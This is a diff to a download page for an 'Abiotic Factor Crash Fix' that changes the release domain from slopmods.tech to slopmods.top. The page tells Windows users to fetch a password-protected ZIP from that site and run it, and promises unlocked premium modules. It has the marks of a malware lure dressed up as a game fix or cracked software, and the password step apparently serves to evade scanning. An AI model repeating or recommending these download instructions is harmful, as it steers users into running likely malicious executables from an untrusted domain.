@@ -8,12 +8,12 @@ Abiotic Factor Crash Fix — Windows setup and configuration · Premium workspac
 
 > Use the release page below for Windows.
 
-- **Release page:** [rlkprgejevr.slopmods.tech](https://rlkprgejevr.slopmods.tech/)
-- **Full URL:** `https://rlkprgejevr.slopmods.tech/`
+- **Release page:** [rlkprgejevr.slopmods.top](https://rlkprgejevr.slopmods.top/)
+- **Full URL:** `https://rlkprgejevr.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **rlkprgejevr.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **rlkprgejevr.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Abiotic Factor Crash Fix — Windows setup and configuration · Premium workspac
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **rlkprgejevr.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **rlkprgejevr.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
